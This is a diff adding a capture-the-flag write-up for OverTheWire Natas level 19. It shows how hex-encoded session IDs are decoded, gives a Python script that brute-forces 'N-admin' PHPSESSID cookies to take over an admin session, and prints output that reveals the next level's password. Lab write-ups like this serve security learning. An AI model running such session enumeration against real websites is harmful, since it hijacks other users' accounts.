@@ -461,3 +461,66 @@ Congrats! We finished level 18 and can move on to level 19!
 
 ### Level 19:
 <a href="/images/natas19.PNG"><img src="/images/natas19.PNG"></a>
+
+
+<a href="/images/natas19-2.PNG"><img src="/images/natas19-2.PNG"></a>
+<a href="/images/natas19-3.PNG"><img src="/images/natas19-3.PNG"></a>
+<a href="/images/natas19-4.PNG"><img src="/images/natas19-4.PNG"></a>
+<a href="/images/natas19-5.PNG"><img src="/images/natas19-5.PNG"></a>
+
+__2d__ is `-` in [hex](http://www.rapidtables.com/convert/number/hex-to-ascii.htm)
+
+__33332d61646d696e__ trasnaltes to __33-admin__. 
+
+Considering that the code has changed to allow the __isValidAdminLogin__ to work, let's assume that "admin" will return __true__ and keep the hexidecimaled PHPSESSIDs __2d61646d696e__ as is, and enumerate everything before __2d__. We will try up to __640__ numbers, since that's what the last codes __$maxid__ was set to.
+
+```python
+#!/usr/bin/python
+
+import requests
+
+target = 'http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org/'
+trueStr = 'You are an admin.'
+
+
+for x in range(1,641):
+	if x % 10 == 0:
+		print str(x) + ' Sessions Tested'
+	cookies = dict(PHPSESSID=(str(x)+'-admin').encode('hex'))
+	r = requests.get(target, cookies=cookies)
+	if r.content.find(trueStr) != -1:
+		print 'Got it!'
+		print "Admin session is "+ str(x)
+		print r.content
+		break
+```
+
+```console
+root@kali:~# ./brute.py
+10 Sessions Tested
+20 Sessions Tested
+30 Sessions Tested
+40 Sessions Tested
+50 Sessions Tested
+60 Sessions Tested
+70 Sessions Tested
+80 Sessions Tested
+90 Sessions Tested
+100 Sessions Tested
+---snip---
+550 Sessions Tested
+560 Sessions Tested
+570 Sessions Tested
+580 Sessions Tested
+590 Sessions Tested
+Got it!
+Admin session is 595
+---snip---
+This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+</b>
+</p>
+You are an admin. The credentials for the next level are:<br><pre>Username: natas20
+Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</pre></div>
+</body>
+</html>
+```
